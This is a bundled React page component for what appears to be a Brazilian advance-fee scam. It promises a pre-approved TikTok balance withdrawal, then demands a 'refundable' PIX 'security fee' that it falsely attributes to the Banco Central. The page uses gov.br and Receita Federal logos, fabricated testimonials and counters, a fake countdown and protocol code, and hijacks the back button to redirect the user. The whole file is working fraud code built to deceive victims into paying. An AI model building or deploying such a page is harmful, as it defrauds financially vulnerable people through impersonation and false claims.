import { p as T, s as $, r as l, j as e, C as F, v as Y, w as I } from "./index-CJ4HKgLV.js";
// ⚠️ ATENÇÃO: Confirme se o nome do arquivo abaixo é exatamente o do seu use-pix-payment
import { u as usePix, L as LoaderIcon } from "./use-pix-payment-BngzPisj.js"; 
import { c as _ } from "./coin-p-BTqgdHPT.js";
import { r as V } from "./receita-federal-new-C9waySsF.js";
import { C } from "./clock-BPlFhknE.js";
import { S as M } from "./shield-check-C2p4pIjt.js";
import { L as X } from "./lock-COKEO8SK.js";

const O = "/assets/govbr-logo-DUdxlXZj.png",
      J = "/assets/tiktok-logo-CtJns-A9.png",
      K = "/assets/testimonial-lucas-DVva3n8g.jpeg",
      Q = "/assets/testimonial-rafael-CZLwIeTm.jpeg",
      U = "/assets/testimonial-amanda-DWOXdEcF.jpeg",
      W = "/assets/testimonial-carla-Fb5od0Tc.jpeg",
      Z = "/assets/social-proof-1-wtJu8RKO.jpeg",
      H = "/assets/social-proof-2-Bexutqu7.jpeg",
      G = "/assets/social-proof-3-CQJriiT6.jpeg",
      ee = "/assets/social-proof-4-rJbdLVAM.jpeg";

const useTimer = i => {
    const [r, u] = l.useState(i * 60);
    l.useEffect(() => {
        if (r <= 0) return;
        const x = setInterval(() => u(a => Math.max(0, a - 1)), 1e3);
        return () => clearInterval(x);
    }, [r]);
    const d = Math.floor(r / 60), c = r % 60;
    return `${String(d).padStart(2, "0")}:${String(c).padStart(2, "0")}`;
};

const formatCPF = i => {
    if (!i || (typeof i !== 'string' && typeof i !== 'number')) return null;
    const r = String(i).replace(/\D/g, "");
    return r.length !== 11 ? null : `***.${r.slice(3, 6)}.${r.slice(6, 9)}-**`;
};

const WithdrawConfirm = () => {
    const navigate = T();
    const location = $();
    const headerTimer = useTimer(10);
    
    const { amount: d = "10", pixKeyType: c = "email", pixKey: x = "", customerData: a = null } = location.state || {};
    const fallbackState = { amount: d, pixKeyType: c, pixKey: x, customerData: a };

    const handleBack = () => { navigate("/back-redirect", { state: fallbackState, replace: true }); };

    l.useEffect(() => {
        window.history.pushState(null, "", window.location.href);
        const handlePop = () => { handleBack(); };
        window.addEventListener("popstate", handlePop);
        return () => window.removeEventListener("popstate", handlePop);
    }, []);

    const [isVisible, setIsVisible] = l.useState(false);
    const [dynamicPixAmount, setDynamicPixAmount] = l.useState(null);

    const baseBalance = Number(d) || 10;
    const finalCents = Number(dynamicPixAmount ?? 3222);
    const securityFee = finalCents / 100;

    const firstName = a?.name?.split(" ")[0] || "";
    const cpfMasked = formatCPF(a?.document);
    const protocolCode = l.useMemo(() => `TT-${new Date().getFullYear()}-${Math.random().toString(36).substring(2, 8).toUpperCase()}`, []);

    // Integração blindada com o seu hook atualizado
    const {
        loading,
        pixData,
        copied,
        pixTimer,
        pixRef,
        customer,
        handlePay,
        handleCopy
    } = usePix({
        amountInCents: finalCents,
        redirectTo: "/upsell-1",
        customerData: a,
        extraState: fallbackState,
        description: "Taxa de Segurança"
    });

    l.useEffect(() => {
        const t = setTimeout(() => setIsVisible(true), 100);
        return () => clearTimeout(t);
    }, []);

    l.useEffect(() => {
        if (pixData?.amount) { setDynamicPixAmount(pixData.amount); }
    }, [pixData]);

    const formatMoney = t => `R$ ${Number(t).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
    const today = new Date().toLocaleDateString("pt-BR");
    const keyLabels = { cpf: "CPF", email: "E-mail", phone: "Celular", random: "Chave aleatória" };

    return e.jsxs("div", {
        className: "min-h-screen bg-black max-w-[430px] mx-auto pb-8",
        children: [
            e.jsxs("header", {
                className: "h-[56px] flex items-center justify-between px-4 bg-[#111111] sticky top-0 z-50 shadow-sm border-b border-[#222222]",
                children: [
                    e.jsx(F, { size: 24, className: "text-[#E0E0E0] cursor-pointer active:scale-90 transition-transform", onClick: handleBack }),
                    e.jsx("h1", { className: "font-bold text-[17px] text-[#E0E0E0]", children: "Confirmação de saque" }),
                    e.jsx("div", { className: "w-6" })
                ]
            }),
            e.jsxs("div", {
                className: "flex items-center justify-center gap-2 py-2 bg-[#111111] border-b border-[#222222]",
                children: [
                    e.jsx(C, { size: 14, className: "text-[#C0C0C0]" }),
                    e.jsx("span", { className: "text-[13px] text-[#888888]", children: "Tempo restante:" }),
                    e.jsx("span", { className: "text-[14px] font-bold text-[#C0C0C0]", style: { fontVariantNumeric: "tabular-nums" }, children: headerTimer })
                ]
            }),
            cpfMasked && e.jsxs("div", {
                className: "mx-4 mt-3 bg-[#10B981]/10 border border-[#10B981]/20 rounded-[12px] py-2.5 px-4 flex items-center gap-2 transition-all duration-500 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(8px)" },
                children: [
                    e.jsx(M, { size: 15, className: "text-[#10B981] shrink-0" }),
                    e.jsxs("p", { className: "text-[#E0E0E0] text-[12px]", children: ["CPF ", e.jsx("span", { className: "font-bold", children: cpfMasked }), " pré-aprovado para saque imediato"] })
                ]
            }),
            e.jsx("div", {
                className: "mx-4 mt-2 flex items-center justify-center",
                children: e.jsxs("p", { className: "text-[#888888] text-[10px]", children: ["Protocolo: ", e.jsx("span", { className: "font-mono font-semibold text-[#A0A0A0]", children: protocolCode })] })
            }),
            e.jsxs("div", {
                className: "mx-4 mt-2 relative transition-all duration-700 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(12px)" },
                children: [
                    e.jsxs("div", {
                        className: "bg-[#1A1A1A] rounded-t-[16px] p-5 pb-5 relative overflow-hidden border border-[#333333] border-b-0",
                        children: [
                            e.jsx("p", { className: "text-[#A0A0A0] text-[14px]", children: firstName ? `${firstName}, seu saldo` : "Saldo disponível" }),
                            e.jsx("p", { className: "text-white text-[38px] font-extrabold leading-tight tracking-tight mt-1", style: { fontVariantNumeric: "tabular-nums" }, children: formatMoney(baseBalance) }),
                            e.jsx("p", { className: "text-[#888888] text-[13px]", children: "Aguardando confirmação para saque" }),
                            e.jsx("img", { src: _, alt: "", width: 90, height: 90, className: "absolute right-4 top-3 w-[90px] h-[90px]", style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "rotate(0deg) scale(1)" : "rotate(-90deg) scale(0.5)", transition: "all 1s ease-out" } })
                        ]
                    }),
                    e.jsxs("div", {
                        className: "relative bg-[#1A1A1A] border-x border-[#333333]",
                        children: [
                            e.jsx("div", { className: "absolute left-0 top-1/2 -translate-y-1/2 -translate-x-1/2 w-[20px] h-[20px] rounded-full bg-black border-r border-[#333333]" }),
                            e.jsx("div", { className: "absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 w-[20px] h-[20px] rounded-full bg-black border-l border-[#333333]" }),
                            e.jsx("div", { className: "border-t-[2px] border-dashed border-[#444444] mx-5" })
                        ]
                    }),
                    e.jsxs("div", {
                        className: "bg-[#1A1A1A] rounded-b-[16px] px-5 py-3 flex items-center justify-between border border-[#333333] border-t-0",
                        children: [
                            e.jsx("span", { className: "text-[#A0A0A0] text-[13px]", children: "Suas transações: R$ 0,03" }),
                            e.jsx(F, { size: 18, className: "text-[#A0A0A0] rotate-180" })
                        ]
                    })
                ]
            }),
            e.jsxs("div", {
                className: "mx-4 mt-4 bg-[#111111] rounded-[16px] border border-[#222222] p-5 transition-all duration-500 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(16px)", transitionDelay: "150ms" },
                children: [
                    e.jsx("p", { className: "text-[#A0A0A0] text-[12px] uppercase tracking-wide font-bold mb-3", children: "Contribuição de segurança" }),
                    e.jsxs("div", { className: "flex items-center gap-3 mb-3", children: [e.jsx("span", { className: "text-[#10B981] text-[28px] font-extrabold", children: formatMoney(securityFee) }), e.jsx("span", { className: "text-[#10B981] text-[11px] font-bold border border-[#10B981] rounded-full px-2.5 py-0.5 animate-pulse", children: "100% REEMBOLSÁVEL" })] }),
                    e.jsxs("p", { className: "text-[#A0A0A0] text-[14px] leading-relaxed", children: ["Contribuição de segurança exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", { className: "text-white", children: formatMoney(baseBalance) }), ". O valor de ", e.jsx("strong", { className: "text-white", children: formatMoney(securityFee) }), " será devolvido integralmente na sua chave Pix em 1 minuto."] }),
                    e.jsxs("div", {
                        className: "mt-3 bg-[#1A1A1A] rounded-[10px] p-3 space-y-1.5 border border-[#2A2A2A]",
                        children: [
                            e.jsx("p", { className: "text-[#888888] text-[10px] uppercase tracking-wider font-bold mb-1", children: "Composição da taxa" }),
                            e.jsxs("div", { className: "flex items-center justify-between", children: [e.jsx("span", { className: "text-[#888888] text-[12px]", children: "Validação BCB" }), e.jsx("span", { className: "text-[#E0E0E0] text-[12px] font-semibold", children: "R$ 18,10" })] }),
                            e.jsxs("div", { className: "flex items-center justify-between", children: [e.jsx("span", { className: "text-[#888888] text-[12px]", children: "Seguro antifraude" }), e.jsx("span", { className: "text-[#E0E0E0] text-[12px] font-semibold", children: "R$ 18,10" })] }),
                            e.jsxs("div", { className: "border-t border-[#333333] pt-1.5 flex items-center justify-between", children: [e.jsx("span", { className: "text-[#E0E0E0] text-[12px] font-bold", children: "Total (reembolsável)" }), e.jsx("span", { className: "text-[#10B981] text-[12px] font-bold", children: formatMoney(securityFee) })] })
                        ]
                    })
                ]
            }),
            !pixData && e.jsx("div", {
                className: "mx-4 mt-4 bg-[#111111] rounded-[16px] border border-[#222222] p-4 transition-all duration-500 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(16px)", transitionDelay: "250ms" },
                children: e.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [
                        e.jsxs("div", { className: "flex flex-col items-center flex-1", children: [e.jsx("div", { className: "w-[32px] h-[32px] rounded-full bg-[#C0C0C0] flex items-center justify-center", children: e.jsx("span", { className: "text-black text-[11px] font-bold", children: "1" }) }), e.jsxs("p", { className: "text-[#E0E0E0] text-[10px] font-bold mt-1.5 text-center leading-tight", children: ["Pagar", e.jsx("br", {}), formatMoney(securityFee)] })] }),
                        e.jsx("div", { className: "h-[2px] bg-[#333333] flex-1 mx-1 mt-[-16px]" }),
                        e.jsxs("div", { className: "flex flex-col items-center flex-1", children: [e.jsx("div", { className: "w-[32px] h-[32px] rounded-full bg-[#2A2A2A] border border-[#3A3A3A] flex items-center justify-center", children: e.jsx("span", { className: "text-[#888888] text-[11px] font-bold", children: "2" }) }), e.jsxs("p", { className: "text-[#888888] text-[10px] mt-1.5 text-center leading-tight", children: ["Reembolso", e.jsx("br", {}), "em 1 min"] })] }),
                        e.jsx("div", { className: "h-[2px] bg-[#333333] flex-1 mx-1 mt-[-16px]" }),
                        e.jsxs("div", { className: "flex flex-col items-center flex-1", children: [e.jsx("div", { className: "w-[32px] h-[32px] rounded-full bg-[#2A2A2A] border border-[#3A3A3A] flex items-center justify-center", children: e.jsx("span", { className: "text-[#888888] text-[11px] font-bold", children: "3" }) }), e.jsxs("p", { className: "text-[#888888] text-[10px] mt-1.5 text-center leading-tight", children: [formatMoney(baseBalance), e.jsx("br", {}), "na conta"] })] })
                    ]
                })
            }),
            e.jsxs("div", {
                className: "mx-4 mt-4 bg-[#111111] border border-[#222222] rounded-[16px] p-5 transition-all duration-500 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(16px)", transitionDelay: "300ms" },
                children: [
                    e.jsx("p", { className: "text-[#888888] text-[12px] uppercase tracking-wide font-bold mb-4", children: "Dados para reembolso" }),
                    e.jsxs("div", { className: "flex items-center justify-between py-3 border-b border-[#222222]", children: [e.jsx("span", { className: "text-[#888888] text-[15px]", children: "Data" }), e.jsx("span", { className: "font-semibold text-[15px] text-[#E0E0E0]", children: today })] }),
                    e.jsxs("div", { className: "flex items-center justify-between py-3 border-b border-[#222222]", children: [e.jsx("span", { className: "text-[#888888] text-[15px]", children: "Chave PIX" }), e.jsx("span", { className: "font-semibold text-[15px] text-[#E0E0E0]", children: keyLabels[c] || c })] }),
                    e.jsxs("div", { className: "flex items-center justify-between py-3 border-b border-[#222222]", children: [e.jsx("span", { className: "text-[#888888] text-[15px]", children: "Valor a receber" }), e.jsx("span", { className: "font-bold text-[15px] text-[#E0E0E0]", children: formatMoney(baseBalance) })] }),
                    e.jsx("button", { className: "w-full h-[48px] bg-[#222222] text-[#E0E0E0] border border-[#333333] font-semibold text-[15px] rounded-[10px] mt-4", children: x })
                ]
            }),
            e.jsx("div", { className: "mx-4 my-4 border-t border-[#222222]" }),
            pixData && e.jsxs("div", {
                ref: pixRef, className: "mx-4 mb-4 bg-[#111111] rounded-[16px] border border-[#222222] p-5 transition-all duration-500 ease-out",
                children: [
                    e.jsx("div", { className: "flex justify-center mb-3", children: e.jsx("img", { src: J, alt: "TikTok", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain invert opacity-80" }) }),
                    e.jsx("p", { className: "text-[#888888] text-[12px] uppercase tracking-wide font-bold mb-4 text-center", children: "Pague com PIX" }),
                    pixData.qr_code_base64 ? e.jsx("div", { className: "flex justify-center mb-4", children: e.jsx("img", { src: pixData.qr_code_base64, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px] border border-[#333333] p-2 bg-white" }) }) 
                    : pixData.qr_code ? e.jsx("div", { className: "flex justify-center mb-4", children: e.jsx("img", { src: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.qr_code)}`, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px] border border-[#333333] p-2 bg-white" }) }) : null,
                    e.jsx("p", { className: "text-[#888888] text-[12px] text-center mb-3", children: "Ou copie o código PIX abaixo:" }),
                    pixData?.amount && e.jsx("div", { className: "text-center font-extrabold text-[18px] text-[#C0C0C0] mb-3", children: "Valor: R$ " + (pixData.amount / 100).toFixed(2).replace(".", ",") }),
                    e.jsx("div", { className: "relative", children: e.jsx("div", { className: "w-full bg-[#1A1A1A] border border-[#2A2A2A] rounded-[10px] p-3 text-[12px] text-[#E0E0E0] break-all leading-relaxed max-h-[80px] overflow-y-auto", children: pixData.qr_code }) }),
                    e.jsxs("button", { onClick: handleCopy, className: "w-full h-[48px] bg-[#C0C0C0] text-black font-bold text-[15px] rounded-[12px] mt-3 flex items-center justify-center gap-2 active:scale-[0.98] transition-all", children: [copied ? e.jsx(Y, { size: 18 }) : e.jsx(I, { size: 18 }), copied ? "Código copiado!" : "Copiar código PIX"] }),
                    pixTimer && e.jsxs("p", { className: "text-[#C0C0C0] text-[13px] text-center mt-3 font-bold", style: { fontVariantNumeric: "tabular-nums" }, children: ["Expira em: ", pixTimer] })
                ]
            }),
            !pixData && e.jsxs("div", {
                className: "mx-4 bg-[#111111] rounded-[16px] border border-[#222222] p-4 transition-all duration-500 ease-out space-y-3",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(16px)", transitionDelay: "400ms" },
                children: [
                    e.jsx("p", { className: "text-[#888888] text-[11px] uppercase tracking-wider font-bold text-center mb-1", children: "Quem já sacou hoje" }),
                    [{ img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque, nunca mais duvido" }, { img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min", text: "gente eu tava morrendo de medo mas fiz e caiu certinho, obrigada tiktok por essa oportunidade serio" }, { img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min", text: "terceira vez sacando ja, toda vez cai em menos de 2 min, nao tem erro nenhum" }, { img: W, name: "Carla F.", city: "Curitiba", value: "R$ 980", time: "há 1h", text: "quase nao fiz por causa da taxa mas devolveram tao rapido q nem deu tempo de me arrepender kkk" }].map((t, f) => e.jsxs("div", { className: "flex gap-3 items-start py-2 border-b border-[#222222] last:border-0", children: [e.jsx("img", { src: t.img, alt: t.name, className: "w-[40px] h-[40px] rounded-full object-cover shrink-0 opacity-80" }), e.jsxs("div", { className: "flex-1 min-w-0", children: [e.jsxs("div", { className: "flex items-center justify-between", children: [e.jsx("span", { className: "text-[#E0E0E0] text-[13px] font-semibold", children: t.name }), e.jsxs("span", { className: "text-[#10B981] text-[11px] font-bold", children: [t.value, " ✓"] })] }), e.jsxs("p", { className: "text-[#A0A0A0] text-[12px] italic leading-snug mt-0.5", children: ['"', t.text, '"'] }), e.jsxs("p", { className: "text-[#666666] text-[10px] mt-0.5", children: [t.city, " · ", t.time] })] })] }, f)),
                    e.jsxs("div", { className: "flex items-center justify-center gap-1.5 pt-1", children: [e.jsx("div", { className: "flex -space-x-2", children: [Z, H, G, ee].map((t, f) => e.jsx("img", { src: t, alt: "", loading: "lazy", className: "w-[22px] h-[22px] rounded-full object-cover border-2 border-[#111111] opacity-80", style: { imageRendering: "pixelated" } }, f)) }), e.jsx("span", { className: "text-[#888888] text-[11px] ml-1", children: "+8.432 saques confirmados hoje" })] })
                ]
            }),
            e.jsx("div", {
                className: "mx-4 mt-4 bg-[#111111] rounded-[16px] border border-[#222222] p-5 transition-all duration-500 ease-out",
                style: { opacity: isVisible ? 1 : 0, transform: isVisible ? "translateY(0)" : "translateY(16px)", transitionDelay: "500ms" },
                children: pixData ? e.jsxs("div", { className: "flex items-center justify-center gap-2", children: [e.jsx(LoaderIcon, { size: 16, className: "animate-spin text-[#C0C0C0]" }), e.jsx("span", { className: "text-[#888888] text-[14px] font-medium", children: "Aguardando pagamento..." })] }) : e.jsxs(e.Fragment, { children: [e.jsx("button", { onClick: handlePay, disabled: loading, className: "w-full h-[56px] bg-[#C0C0C0] text-black font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 active:scale-[0.98] transition-all duration-150 shadow-[0_4px_14px_rgba(192,192,192,0.15)] disabled:opacity-50", children: loading ? e.jsx(LoaderIcon, { size: 22, className: "animate-spin" }) : e.jsxs(e.Fragment, { children: [e.jsx(X, { size: 17 }), "CONFIRMAR E LIBERAR ", formatMoney(baseBalance)] }) }), e.jsxs("div", { className: "flex items-center justify-center gap-1.5 mt-3", children: [e.jsx(C, { size: 14, className: "text-[#10B981]" }), e.jsxs("span", { className: "text-[#10B981] text-[13px] font-semibold", children: ["Reembolso de ", formatMoney(securityFee), " em 1 minuto"] })] })] })
            }),
            e.jsxs("div", {
                className: "flex items-center justify-center gap-8 mt-6 mb-2 px-4",
                children: [e.jsx("img", { src: O, alt: "gov.br", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain invert opacity-60" }), e.jsx("img", { src: V, alt: "Receita Federal", loading: "lazy", width: 50, height: 50, className: "h-[50px] object-contain invert opacity-60" })]
            }),
            e.jsxs("div", {
                className: "mx-4 mt-4 border-t border-[#222222] pt-4 pb-6",
                children: [e.jsx("p", { className: "text-[#888888] text-[13px] text-center", children: "Processo 100% seguro" }), e.jsxs("p", { className: "text-[#666666] text-[9px] text-center mt-1", children: ["Protocolo ", protocolCode] }), e.jsx("p", { className: "text-[#C0C0C0] text-[13px] text-center font-semibold mt-1 cursor-pointer", onClick: () => navigate("/faq"), children: "Precisa de ajuda?" })]
            })
        ]
    });
};

export { WithdrawConfirm as default };
